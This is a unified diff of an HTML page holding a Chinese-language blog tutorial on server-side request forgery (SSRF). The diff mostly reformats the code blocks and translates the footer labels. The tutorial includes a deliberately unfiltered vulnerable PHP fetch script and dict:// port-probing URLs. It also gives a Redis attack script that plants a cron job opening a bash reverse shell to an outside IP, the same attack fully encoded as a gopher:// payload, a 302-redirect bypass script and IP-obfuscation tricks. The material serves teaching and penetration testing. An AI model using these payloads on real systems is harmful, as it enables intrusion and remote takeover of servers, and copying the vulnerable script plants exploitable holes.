@@ -117,46 +117,68 @@
 <p>我们可以利用curl进行抓取网页内容</p>
 <h3 id="伪造请求"><a href="#伪造请求" class="headerlink" title="伪造请求"></a>伪造请求</h3><p>通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。</p>
 <p>类似于这样的形式：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip:port/ssrf.php?url=xxxx</span><br></pre></td></tr></table></figure>
-
-<p>我们构造一个url请求，server端接收并访问传入的url，然后会返回给客户端相应数据（如图片等）。正常情况下，服务端希望我们传入的url是一个正常的链接，可能是站内的图片、网链，也可能是站外的其它友链。php后端使用<strong>cURL</strong>初始化一个新的cURL会话并获取一个网页。</p>
+<pre><code>ip:port/ssrf.php?url=xxxx</code></pre><p>我们构造一个url请求，server端接收并访问传入的url，然后会返回给客户端相应数据（如图片等）。正常情况下，服务端希望我们传入的url是一个正常的链接，可能是站内的图片、网链，也可能是站外的其它友链。php后端使用<strong>cURL</strong>初始化一个新的cURL会话并获取一个网页。</p>
 <p>但是，如果我们通过curl允许的协议来传递给url这个参数一些邪恶的信息呢？后果可想而知</p>
 <h2 id="SSRF分析"><a href="#SSRF分析" class="headerlink" title="SSRF分析"></a>SSRF分析</h2><h3 id="漏洞搭建"><a href="#漏洞搭建" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h3><p>ssrf漏洞代码，未作过滤</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">// 创建一个新cURL资源</span><br><span class="line">$ch = curl_init(); </span><br><span class="line"></span><br><span class="line">// 设置URL和相应的选项</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[&apos;url&apos;]); </span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0); </span><br><span class="line"></span><br><span class="line">// 抓取URL并把它传递给浏览器</span><br><span class="line">curl_exec($ch); </span><br><span class="line"></span><br><span class="line">// 关闭cURL资源，并且释放系统资源</span><br><span class="line">curl_close($ch); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?php 
+// 创建一个新cURL资源
+$ch = curl_init(); 
 
-<h3 id="file协议查看文件"><a href="#file协议查看文件" class="headerlink" title="file协议查看文件"></a>file协议查看文件</h3><p><img src="https://s1.ax1x.com/2018/08/10/P6BOht.png" alt></p>
+// 设置URL和相应的选项
+curl_setopt($ch, CURLOPT_URL, $_GET[&#39;url&#39;]); 
+curl_setopt($ch, CURLOPT_HEADER, 0); 
+
+// 抓取URL并把它传递给浏览器
+curl_exec($ch); 
+
+// 关闭cURL资源，并且释放系统资源
+curl_close($ch); 
+?&gt;</code></pre><h3 id="file协议查看文件"><a href="#file协议查看文件" class="headerlink" title="file协议查看文件"></a>file协议查看文件</h3><p><img src="https://s1.ax1x.com/2018/08/10/P6BOht.png" alt></p>
 <p>我们url传入的file协议语句，会在服务会执行一个curl语句，返回查询的信息。这个是基于有回显的情况，不过现在很多php后端如果这样写的话：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1)</span><br></pre></td></tr></table></figure>
-
-<p>协议就算失效了，这种方法失败</p>
+<pre><code>curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1)</code></pre><p>协议就算失效了，这种方法失败</p>
 <h3 id="dict协议探测端口"><a href="#dict协议探测端口" class="headerlink" title="dict协议探测端口"></a>dict协议探测端口</h3><p>探测22端口(ssh服务)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:port/ssrf.php?url=dict://127.0.0.1:22/info</span><br></pre></td></tr></table></figure>
-
-<p>服务端会执行：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;dict://127.0.0.1:22/info&apos;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s1.ax1x.com/2018/08/11/P6Rt78.png" alt></p>
+<pre><code>http://ip:port/ssrf.php?url=dict://127.0.0.1:22/info</code></pre><p>服务端会执行：</p>
+<pre><code>curl -v &#39;dict://127.0.0.1:22/info&#39;</code></pre><p><img src="https://s1.ax1x.com/2018/08/11/P6Rt78.png" alt></p>
 <p>探测3306端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://ip:port/ssrf.php?url=dict://127.0.0.1:3306</span><br><span class="line">/info</span><br></pre></td></tr></table></figure>
-
-<h3 id="Gopher协议攻击redis反弹shell"><a href="#Gopher协议攻击redis反弹shell" class="headerlink" title="Gopher协议攻击redis反弹shell"></a>Gopher协议攻击redis反弹shell</h3><p>Redis 任意文件写入现在已经成为十分常见的一个漏洞，一般内网中会存在 root 权限运行的 Redis 服务，利用 Gopher 协议攻击内网中的 Redis，这无疑可以隔山打牛，直杀内网。<br>首先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议。常见的 exp 是这样的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h $1 flushall</span><br><span class="line">echo -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/要反弹的公网ip/反弹端口 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1</span><br><span class="line">redis-cli -h $1 config set dir /var/spool/cron/</span><br><span class="line">redis-cli -h $1 config set dbfilename root</span><br><span class="line">redis-cli -h $1 save</span><br></pre></td></tr></table></figure>
-
-<p>这里网址以127.0.0.1，redis端口6379，公网ip为172.19.23.228且监听端口为2333为例<br>改成适配于 Gopher 协议的 URL：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure>
-
-<h3 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h3><p>Curl默认不支持302跳转，所以需要在ssrf.php中加上一行<code>curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1)</code>来支持跳转</p>
+<pre><code>http://ip:port/ssrf.php?url=dict://127.0.0.1:3306
+/info</code></pre><h3 id="Gopher协议攻击redis反弹shell"><a href="#Gopher协议攻击redis反弹shell" class="headerlink" title="Gopher协议攻击redis反弹shell"></a>Gopher协议攻击redis反弹shell</h3><p>Redis 任意文件写入现在已经成为十分常见的一个漏洞，一般内网中会存在 root 权限运行的 Redis 服务，利用 Gopher 协议攻击内网中的 Redis，这无疑可以隔山打牛，直杀内网。<br>首先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议。常见的 exp 是这样的：</p>
+<pre><code>redis-cli -h $1 flushall
+echo -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/要反弹的公网ip/反弹端口 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1
+redis-cli -h $1 config set dir /var/spool/cron/
+redis-cli -h $1 config set dbfilename root
+redis-cli -h $1 save</code></pre><p>这里网址以127.0.0.1，redis端口6379，公网ip为172.19.23.228且监听端口为2333为例<br>改成适配于 Gopher 协议的 URL：</p>
+<pre><code>gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</code></pre><h3 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h3><p>Curl默认不支持302跳转，所以需要在ssrf.php中加上一行<code>curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1)</code>来支持跳转</p>
 <p>代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function curl($url)&#123;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);</span><br><span class="line">// 限制为HTTPS、HTTP协议</span><br><span class="line">curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[&apos;url&apos;];</span><br><span class="line">curl($url);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>function curl($url){
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);
+// 限制为HTTPS、HTTP协议
+curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_exec($ch);
+curl_close($ch);
+}
 
-<p>php限制为http、https协议之后，我们就无法使用刚才的file dict gopher的协议了，但是我们如果开启302跳转的话可以，跳转到我们自己的vps上的网页来执行这些协议。因为服务端并没有ban掉这些协议，所以我们就找一个跳板来执行</p>
+$url = $_GET[&#39;url&#39;];
+curl($url);
+?&gt;</code></pre><p>php限制为http、https协议之后，我们就无法使用刚才的file dict gopher的协议了，但是我们如果开启302跳转的话可以，跳转到我们自己的vps上的网页来执行这些协议。因为服务端并没有ban掉这些协议，所以我们就找一个跳板来执行</p>
 <p>302辅助跳转脚本：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$schema = $_GET[&apos;schema&apos;];</span><br><span class="line">$ip     = $_GET[&apos;ip&apos;];</span><br><span class="line">$port   = $_GET[&apos;port&apos;];</span><br><span class="line">$query  = $_GET[&apos;query&apos;];</span><br><span class="line"></span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo $schema . &quot;://&quot;.$ip.&quot;/&quot;.$query;</span><br><span class="line"></span><br><span class="line">if(empty($port))&#123;  </span><br><span class="line">    header(&quot;Location: $schema://$ip/$query&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    header(&quot;Location: $schema://$ip:$port/$query&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?php  
+$schema = $_GET[&#39;schema&#39;];
+$ip     = $_GET[&#39;ip&#39;];
+$port   = $_GET[&#39;port&#39;];
+$query  = $_GET[&#39;query&#39;];
 
-<p>通过http/s协议引入我们自己的php脚本，这样就可以执行其他协议语句<br>发送的请求如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ssrf.php?url=http://your vps&apos;s ip/302.php?schema=dict%26ip=127.0.0.1%26port=22%26query=info</span><br></pre></td></tr></table></figure>
+echo &quot;\n&quot;;
+echo $schema . &quot;://&quot;.$ip.&quot;/&quot;.$query;
 
-<p>注意是POST请求还是GET请求</p>
+if(empty($port)){  
+    header(&quot;Location: $schema://$ip/$query&quot;);
+} else {
+    header(&quot;Location: $schema://$ip:$port/$query&quot;);
+}</code></pre><p>通过http/s协议引入我们自己的php脚本，这样就可以执行其他协议语句<br>发送的请求如下：</p>
+<pre><code>http://127.0.0.1/ssrf.php?url=http://your vps&#39;s ip/302.php?schema=dict%26ip=127.0.0.1%26port=22%26query=info</code></pre><p>注意是POST请求还是GET请求</p>
 <h2 id="SSRF挖掘"><a href="#SSRF挖掘" class="headerlink" title="SSRF挖掘"></a>SSRF挖掘</h2><p>社交分享功能<br>转码服务<br>在线翻译<br>在线代理浏览器<br>图片加载/下载<br>图片/文章收藏功能<br>API或调用外部URL的功能</p>
 <h2 id="SSRF绕过"><a href="#SSRF绕过" class="headerlink" title="SSRF绕过"></a>SSRF绕过</h2><h3 id="IP地址转换绕过"><a href="#IP地址转换绕过" class="headerlink" title="IP地址转换绕过"></a>IP地址转换绕过</h3><p>数字地址(十进制)：127.0.0.1-&gt;2130706433<br>十六进制：127.0.0.1-&gt;0x7F000001或0x7F.00.00.01或0x7F.0x00.0x00.0x01<br>八进制： 127.0.0.1-&gt;0177.0.0.1或0177.00.00.01<br>省略写法：127.0.0.1-&gt;127.1</p>
 <h3 id="xip-io绕过"><a href="#xip-io绕过" class="headerlink" title="xip.io绕过"></a>xip.io绕过</h3><p>127.0.0.1.xip.io<br><a href="http://www.127.0.0.1.xip.io" target="_blank" rel="noopener">www.127.0.0.1.xip.io</a><br>xxx.127.0.0.1.xip.io<br>fuzz.xxx.127.0.0.1.xip.io</p>
@@ -169,16 +191,16 @@
            
             <div class="copyright">
                 <div class="name">
-                    <a>本文作者:</a>
+                    <a>Author:</a>
                     <a>Sōsuke</a>
                 </div>
                 <div class="link">
-                    <a>本文链接:</a>
+                    <a>Link:</a>
                     <a class="permalink" href="https://hpdoger.cn/2018/08/10/初探ssrf/">https://hpdoger.cn/2018/08/10/初探ssrf/</a>
                 </div>
                 <div class="license">
-                    <a>版权声明:</a>
-                    <a>本博客所有文章除特别声明外，均采用许可协议 CC BY-NC-SA 3.0 CN。转载请注明出处！</a>
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
                 </div>
             </div>
             
@@ -191,7 +213,7 @@
 
 <div class="tip">
 <button class="tip-btn">
-    打赏
+    Tip
 </button>
 <div class="tip-img">
 <ul>
